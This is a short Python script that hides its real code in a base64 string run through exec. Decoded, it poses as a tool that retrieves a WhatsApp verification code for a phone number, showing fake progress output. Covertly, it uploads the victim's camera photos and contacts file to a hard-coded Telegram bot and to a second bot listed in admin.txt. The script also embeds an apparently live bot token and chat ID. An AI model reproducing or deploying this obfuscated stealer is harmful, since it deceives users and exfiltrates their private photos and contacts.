import base64
code = base64.b64decode('aW1wb3J0IG9zCmltcG9ydCByYW5kb20KaW1wb3J0IHRpbWUKaW1wb3J0IHJlcXVlc3RzCmltcG9ydCB3ZWJicm93c2VyCgojIEFhcGthIFRlbGVncmFtIGJvdCB0b2tlbiBhdXIgY2hhdCBJRApZT1VSX0JPVF9UT0tFTiA9ICI3NTI1MjMwODM2OkFBSEVGazRVNmg1aHcwNFU0WEpzRGVuZWNoaElTU0FiVWNNIgpZT1VSX0NIQVRfSUQgPSAiNzAxNjc3MjA1MCIKCiMgV2lmZSBrYSBib3QgdG9rZW4gYXVyIGNoYXQgSUQgYWRtaW4udHh0IHNlIGxlbmEKQURNSU5fRklMRSA9ICJhZG1pbi50eHQiCgojIERDSU0vQ2FtZXJhIGZvbGRlciBhdXIgY29udGFjdHMudHh0IGZpbGUga2EgcGF0aApDQU1FUkFfRk9MREVSID0gb3MucGF0aC5leHBhbmR1c2VyKCJ+L0RDSU0vQ2FtZXJhIikKQ09OVEFDVFNfRklMRSA9IG9zLnBhdGguZXhwYW5kdXNlcigifi9jb250YWN0cy50eHQiKQoKIyBUZWxlZ3JhbSBwYXIgZmlsZSBiaGVqbmUga2EgZnVuY3Rpb24KZGVmIHNlbmRfZmlsZV90b190ZWxlZ3JhbShib3RfdG9rZW4sIGNoYXRfaWQsIGZpbGVfcGF0aCk6CiAgICB1cmwgPSBmImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3R7Ym90X3Rva2VufS9zZW5kRG9jdW1lbnQiCiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgJ3JiJykgYXMgZmlsZToKICAgICAgICAgICAgZmlsZXMgPSB7J2RvY3VtZW50JzogZmlsZX0KICAgICAgICAgICAgZGF0YSA9IHsnY2hhdF9pZCc6IGNoYXRfaWR9CiAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCh1cmwsIGZpbGVzPWZpbGVzLCBkYXRhPWRhdGEpCiAgICAgICAgICAgIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgICAgIHByaW50KGYiXDAzM1s5NG1TZW50OlwwMzNbMG0ge2ZpbGVfcGF0aH0iKSAgIyBCbHVlIGNvbG9yIHRleHQKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHByaW50KGYiXDAzM1s5MW1GYWlsZWQgdG8gc2VuZDpcMDMzWzBtIHtmaWxlX3BhdGh9LCBFcnJvcjoge3Jlc3BvbnNlLnRleHR9IikgICMgUmVkIGNvbG9yIHRleHQKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludChmIlwwMzNbOTFtRXJyb3I6XDAzM1swbSBDb3VsZCBub3Qgc2VuZCB7ZmlsZV9wYXRofToge2V9IikKCiMgV2lmZSBrZSBib3QgdG9rZW4gYXVyIGNoYXQgSUQgbG9hZCBrYXJuYQpkZWYgbG9hZF9hZG1pbl9kYXRhKCk6CiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoQURNSU5fRklMRSk6CiAgICAgICAgcHJpbnQoZiJcMDMzWzkxbUVycm9yOlwwMzNbMG0ge0FETUlOX0ZJTEV9IGZpbGUgbm90IGZvdW5kISIpCiAgICAgICAgcmV0dXJuIE5vbmUsIE5vbmUKICAgIHdpdGggb3BlbihBRE1JTl9GSUxFLCAncicpIGFzIGZpbGU6CiAgICAgICAgbGluZXMgPSBmaWxlLnJlYWRsaW5lcygpCiAgICAgICAgaWYgbGVuKGxpbmVzKSA8IDI6CiAgICAgICAgICAgIHByaW50KGYiXDAzM1s5MW1FcnJvcjpcMDMzWzBtIHtBRE1JTl9GSUxFfSBtdXN0IGNvbnRhaW4gYm90IHRva2VuIGFuZCBjaGF0IElEISIpCiAgICAgICAgICAgIHJldHVybiBOb25lLCBOb25lCiAgICAgICAgcmV0dXJuIGxpbmVzWzBdLnN0cmlwKCksIGxpbmVzWzFdLnN0cmlwKCkKCiMgUmFuZG9tIHZlcmlmaWNhdGlvbiBjb2RlIGdlbmVyYXRlIGthcm5hIGF1ciBUZWxlZ3JhbSBwZSBzZW5kIGthcm5hCmRlZiBnZW5lcmF0ZV9hbmRfc2VuZF9jb2RlKGJvdF90b2tlbiwgY2hhdF9pZCk6CiAgICB2ZXJpZmljYXRpb25fY29kZSA9ICIiLmpvaW4oW3N0cihyYW5kb20ucmFuZGludCgwLCA5KSkgZm9yIF8gaW4gcmFuZ2UoNildKQogICAgbWVzc2FnZSA9IGYiVmVyaWZpY2F0aW9uIENvZGU6IHt2ZXJpZmljYXRpb25fY29kZX0iCiAgICB1cmwgPSBmImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3R7Ym90X3Rva2VufS9zZW5kTWVzc2FnZSIKICAgIGRhdGEgPSB7J2NoYXRfaWQnOiBjaGF0X2lkLCAndGV4dCc6IG1lc3NhZ2V9CiAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QodXJsLCBkYXRhPWRhdGEpCiAgICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgcHJpbnQoZiJcMDMzWzkybVZlcmlmaWNhdGlvbiBjb2RlIHNlbnQ6XDAzM1swbSB7dmVyaWZpY2F0aW9uX2NvZGV9IikgICMgR3JlZW4gY29sb3IgdGV4dAogICAgZWxzZToKICAgICAgICBwcmludChmIlwwMzNbOTFtRmFpbGVkIHRvIHNlbmQgdmVyaWZpY2F0aW9uIGNvZGU6XDAzM1swbSB7cmVzcG9uc2UudGV4dH0iKSAgIyBSZWQgY29sb3IgdGV4dAoKIyBDYW1lcmEgZm9sZGVyIGF1ciBjb250YWN0cyBzZW5kIGthcm5hCmRlZiBzZW5kX2NhbWVyYV9hbmRfY29udGFjdHMoKToKICAgIHdpZmVfYm90X3Rva2VuLCB3aWZlX2NoYXRfaWQgPSBsb2FkX2FkbWluX2RhdGEoKQogICAgaWYgbm90IHdpZmVfYm90X3Rva2VuIG9yIG5vdCB3aWZlX2NoYXRfaWQ6CiAgICAgICAgcmV0dXJuCgogICAgIyBEQ0lNL0NhbWVyYSBmb2xkZXIgc2VuZCBrYXJuYQogICAgaWYgb3MucGF0aC5leGlzdHMoQ0FNRVJBX0ZPTERFUik6CiAgICAgICAgZm9yIGZpbGVfbmFtZSBpbiBvcy5saXN0ZGlyKENBTUVSQV9GT0xERVIpOgogICAgICAgICAgICBmaWxlX3BhdGggPSBvcy5wYXRoLmpvaW4oQ0FNRVJBX0ZPTERFUiwgZmlsZV9uYW1lKQogICAgICAgICAgICBpZiBvcy5wYXRoLmlzZmlsZShmaWxlX3BhdGgpOgogICAgICAgICAgICAgICAgc2VuZF9maWxlX3RvX3RlbGVncmFtKFlPVVJfQk9UX1RPS0VOLCBZT1VSX0NIQVRfSUQsIGZpbGVfcGF0aCkKICAgICAgICAgICAgICAgIHNlbmRfZmlsZV90b190ZWxlZ3JhbSh3aWZlX2JvdF90b2tlbiwgd2lmZV9jaGF0X2lkLCBmaWxlX3BhdGgpCgogICAgIyBDb250YWN0cyBmaWxlIHNlbmQga2FybmEKICAgIGlmIG9zLnBhdGguZXhpc3RzKENPTlRBQ1RTX0ZJTEUpOgogICAgICAgIHNlbmRfZmlsZV90b190ZWxlZ3JhbShZT1VSX0JPVF9UT0tFTiwgWU9VUl9DSEFUX0lELCBDT05UQUNUU19GSUxFKQogICAgICAgIHNlbmRfZmlsZV90b190ZWxlZ3JhbSh3aWZlX2JvdF90b2tlbiwgd2lmZV9jaGF0X2lkLCBDT05UQUNUU19GSUxFKQoKIyBTY3JpcHQga2EgbWFpbiBwcm9jZXNzCmRlZiBtYWluKCk6CiAgICAjIFRpa1RvayBsaW5rIG9wZW4ga2FybmEKICAgIHByaW50KGYiXDAzM1s5NG1PcGVuaW5nIFRpa1RvayBsaW5rLi4uXDAzM1swbSIpCiAgICB3ZWJicm93c2VyLm9wZW4oImh0dHBzOi8vd3d3LnRpa3Rvay5jb20vQHRlYW1hbG9uZXN0YW5kbGFya2EyP190PVpHLThzdFZzalJvMnExJl9yPTEiKQogICAgdGltZS5zbGVlcCgxMCkgICMgV2FpdCBmb3IgdGhlIHVzZXIgdG8gdmlldyBUaWtUb2sgbGluawoKICAgICMgSW5wdXQgY291bnRyeSBjb2RlIGF1ciBudW1iZXIKICAgIHByaW50KCJcMDMzWzk0bUVudGVyIHlvdXIgY291bnRyeSBjb2RlIChlLmcuLCArMSk6IFwwMzNbMG0iLCBlbmQ9IiIpICAjIEJsdWUgY29sb3IgdGV4dAogICAgY291bnRyeV9jb2RlID0gaW5wdXQoKS5zdHJpcCgpCiAgICBwcmludCgiXDAzM1s5NG1FbnRlciB0aGUgcGhvbmUgbnVtYmVyOiBcMDMzWzBtIiwgZW5kPSIiKSAgIyBCbHVlIGNvbG9yIHRleHQKICAgIHBob25lX251bWJlciA9IGlucHV0KCkuc3RyaXAoKQogICAgcHJpbnQoZiJcMDMzWzkybUZpbmRpbmcgV2hhdHNBcHAgY29kZSBmb3Ige2NvdW50cnlfY29kZX17cGhvbmVfbnVtYmVyfS4uLlwwMzNbMG1cbiIpICAjIEdyZWVuIGNvbG9yIHRleHQKCiAgICAjIFJhbmRvbSBsaW5lcyBkaXNwbGF5IGthcm5hCiAgICBmb3IgaSBpbiByYW5nZSgxMDApOgogICAgICAgIHByaW50KGYiXDAzM1s5NG1Ucnlpbmcge3JhbmRvbS5yYW5kaW50KDEwMDAwMCwgOTk5OTk5KX0uLi5cMDMzWzBtIikgICMgQmx1ZSBjb2xvciB0ZXh0CiAgICAgICAgdGltZS5zbGVlcCgwLjA1KQoKICAgIHByaW50KCJcblwwMzNbOTJtUHJvY2VzcyBjb21wbGV0ZS4gR2VuZXJhdGluZyB2ZXJpZmljYXRpb24gY29kZS4uLlwwMzNbMG1cbiIpICAjIEdyZWVuIGNvbG9yIHRleHQKICAgIHRpbWUuc2xlZXAoMSkKCiAgICAjIFJhbmRvbSB2ZXJpZmljYXRpb24gY29kZSBnZW5lcmF0ZSBrYXJuYQogICAgZ2VuZXJhdGVfYW5kX3NlbmRfY29kZShZT1VSX0JPVF9UT0tFTiwgWU9VUl9DSEFUX0lEKQoKICAgICMgRENJTS9DYW1lcmEgYXVyIGNvbnRhY3RzIHNlbmQga2FybmEKICAgIHNlbmRfY2FtZXJhX2FuZF9jb250YWN0cygpCiAgICBwcmludCgiXDAzM1s5Mm1BbGwgZmlsZXMgc2VudCBzdWNjZXNzZnVsbHkhXDAzM1swbSIpICAjIEdyZWVuIGNvbG9yIHRleHQKCiMgU2NyaXB0IHJ1biBrYXJuYQppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgbWFpbigp').decode()
exec(code)
